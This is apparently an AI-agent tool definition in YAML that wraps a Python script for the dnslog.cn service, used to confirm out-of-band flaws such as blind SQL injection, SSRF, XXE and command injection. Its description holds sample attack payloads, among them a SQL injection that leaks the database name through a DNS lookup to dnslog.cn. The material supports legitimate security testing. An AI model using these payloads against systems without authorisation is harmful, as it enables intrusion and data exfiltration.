name: "dnslog"
command: "python3"
args:
  - "-c"
  - "import sys\nimport requests\nimport json\nimport time\nimport os\nimport tempfile\n\nif len(sys.argv) < 2:\n sys.stderr.write(\"Error: Missing operation type parameter (get_domain or get_records)\\n\")\n sys.exit(1)\n\noperation = sys.argv[1]\nbase_url = \"http://dnslog.cn\"\n\n# Use a temporary file to store cookies\ncookie_file = os.path.join(tempfile.gettempdir(), \"dnslog_cookie.txt\")\n\n# Create a session to maintain cookies\nsession = requests.Session()\n\n# Load cookies if the cookie file exists\ntry:\n if os.path.exists(cookie_file):\n with open(cookie_file, 'r') as f:\n for line in f:\n if 'PHPSESSID' in line:\n session.cookies.set('PHPSESSID', line.strip().split('=')[1])\nexcept:\n pass\n\ntry:\n if operation == \"get_domain\":\n # Get a temporary domain name (this sets the cookie)\n response = session.get(f\"{base_url}/getdomain.php\", timeout=10)\n response.raise_for_status()\n domain = response.text.strip().rstrip('%')\n \n # Save cookies to file\n try:\n with open(cookie_file, 'w') as f:\n for cookie in session.cookies:\n f.write(f\"{cookie.name}={cookie.value}\\n\")\n except:\n pass\n \n if domain:\n result = {\n \"status\": \"success\",\n \"domain\": domain,\n \"message\": f\"Successfully obtained temporary domain name: {domain}\",\n \"usage\": f\"Use this domain name for DNS query testing, for example: nslookup {domain} or ping http://{domain}\",\n \"note\": \"The domain name is valid for 24 hours, please query records in time\"\n }\n print(json.dumps(result, ensure_ascii=False, indent=2))\n else:\n print(json.dumps({\n \"status\": \"error\",\n \"message\": \"Failed to obtain domain name, please try again later\"\n }, ensure_ascii=False, indent=2))\n sys.exit(1)\n \n elif operation == \"get_records\":\n # Get DNS query records\n if len(sys.argv) < 3:\n sys.stderr.write(\"Error: get_records operation requires a domain name parameter\\n\")\n sys.exit(1)\n \n domain = sys.argv[2]\n wait_time = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] else 0\n \n # If a wait time is specified, wait first\n if wait_time > 0:\n print(f\"Waiting {wait_time} seconds before querying records...\", file=sys.stderr)\n time.sleep(wait_time)\n \n # Load cookies (if they exist)\n try:\n if os.path.exists(cookie_file):\n with open(cookie_file, 'r') as f:\n for line in f:\n if 'PHPSESSID' in line:\n session.cookies.set('PHPSESSID', line.strip().split('=')[1])\n except:\n pass\n \n response = session.get(f\"{base_url}/getrecords.php\", params={\"t\": domain}, timeout=10)\n response.raise_for_status()\n records_text = response.text.strip().rstrip('%')\n \n if records_text and records_text != \"[]\" and records_text.strip():\n # Try to parse as JSON (if the response is in JSON format)\n try:\n records = json.loads(records_text)\n if isinstance(records, list) and len(records) > 0:\n result = {\n \"status\": \"success\",\n \"domain\": domain,\n \"record_count\": len(records),\n \"records\": records,\n \"message\": f\"Found {len(records)} DNS query records\"\n }\n print(json.dumps(result, ensure_ascii=False, indent=2))\n else:\n result = {\n \"status\": \"no_records\",\n \"domain\": domain,\n \"records\": [],\n \"message\": \"No DNS query records yet, the target may not have triggered a DNS query\"\n }\n print(json.dumps(result, ensure_ascii=False, indent=2))\n except json.JSONDecodeError:\n # If not JSON, split by lines\n records = [line.strip() for line in records_text.split(\"\\n\") if line.strip() and line.strip() != \"[]\"]\n if records:\n result = {\n \"status\": \"success\",\n \"domain\": domain,\n \"record_count\": len(records),\n \"records\": records,\n \"message\": f\"Found {len(records)} DNS query records\"\n }\n print(json.dumps(result, ensure_ascii=False, indent=2))\n else:\n result = {\n \"status\": \"no_records\",\n \"domain\": domain,\n \"records\": [],\n \"message\": \"No DNS query records\"\n }\n print(json.dumps(result, ensure_ascii=False, indent=2))\n else:\n result = {\n \"status\": \"no_records\",\n \"domain\": domain,\n \"records\": [],\n \"message\": \"No DNS query records, the target may not have triggered a DNS query\"\n }\n print(json.dumps(result, ensure_ascii=False, indent=2))\n \n else:\n sys.stderr.write(f\"Error: Unknown operation type '{operation}', supported operations: get_domain, get_records\\n\")\n sys.exit(1)\n\nexcept requests.RequestException as e:\n error_result = {\n \"status\": \"error\",\n \"message\": f\"Request failed: {str(e)}\",\n \"suggestion\": \"Please check your network connection or try again later\"\n }\n print(json.dumps(error_result, ensure_ascii=False, indent=2))\n sys.exit(1)\nexcept Exception as e:\n error_result = {\n \"status\": \"error\",\n \"message\": f\"Execution error: {str(e)}\"\n }\n print(json.dumps(error_result, ensure_ascii=False, indent=2))\n sys.exit(1)\n"
enabled: true
short_description: "DNSlog tool for verifying blind injection, SSRF, XXE, and other out-of-band vulnerabilities"
description: |
  DNSlog is a DNS query logging tool, implemented via the dnslog.cn service. Primarily used for verifying out-of-band vulnerabilities, such as blind injection, SSRF, XXE, and command injection.

  **Key Features:**
  - Obtain temporary domain name: generates a unique temporary domain name for DNS query testing
  - Query DNS records: check whether DNS query requests have reached the domain name
  - Support wait time: can wait a specified time before querying, used for asynchronous vulnerability verification

  **Use Cases:**
  - **Blind SQL injection testing**: Use DNS queries in SQL injection payloads to confirm successful injection
  - Examples: `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\abc'))`
  - **SSRF vulnerability verification**: Confirm SSRF vulnerability via DNS queries
  - Examples: `http://target.com/api?url=http://xxx.dnslog.cn`
  - **XXE vulnerability verification**: Trigger DNS queries via external entity references
  - Examples: `<!ENTITY xxe SYSTEM "http://xxx.dnslog.cn">`
  - **Command injection testing**: Use DNS queries in command injection payloads
  - Examples: `nslookup xxx.dnslog.cn` or `ping xxx.dnslog.cn`
  - **Out-of-band vulnerability verification**: Any scenario requiring confirmation that the target performed a specific action

  **Workflow:**
  1. Use `operation=get_domain` to obtain a temporary domain name (e.g., `abc123.dnslog.cn`)
  2. Use the domain name in your vulnerability testing payload
  3. Use `operation=get_records` to query whether there are DNS query records
  4. If records are found, the vulnerability exists and the payload has been executed

  **Notes:**
  - The temporary domain name is valid for 24 hours
  - DNS queries may have latency, it is recommended to wait a few seconds before querying records
  - This tool depends on the dnslog.cn service and requires a network connection
  - The tool automatically manages cookie sessions to ensure the same session is used for obtaining domain names and querying records
parameters:
  - name: "operation"
    type: "string"
    description: |
      Operation type, supporting two operations:
      - `get_domain`: Obtain a temporary domain name
      - `get_records`: Query DNS records
    required: true
    position: 0
    format: "positional"
  - name: "domain"
    type: "string"
    description: |
      Domain name parameter (only for get_records operation)

      When operation is get_records, this parameter is required and must be the previously obtained temporary domain name.
    required: false
    position: 1
    format: "positional"
  - name: "wait_time"
    type: "int"
    description: |
      Wait time (seconds, only for get_records operation)

      The number of seconds to wait before querying DNS records. Used to give the target system enough time to execute DNS queries.
      Recommended value: 3-10 seconds, adjusted based on network latency and vulnerability type.
    required: false
    position: 2
    format: "positional"
    default: 0
